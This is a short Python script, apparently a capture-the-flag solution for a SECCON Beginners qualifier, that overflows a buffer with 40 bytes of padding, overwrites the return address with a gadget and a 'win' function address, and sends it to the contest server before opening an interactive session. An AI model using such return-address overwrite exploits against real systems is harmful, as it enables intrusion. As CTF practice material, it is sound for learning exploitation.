#!/usr/bin/python3
from ptrlib import *

win = 0x400861
payload = b"A" * 40 + p64(0x4007F0) + p64(win)


sock = Socket("bs.quals.beginners.seccon.jp",9001)
sock.sendline(payload)
sock.interactive()
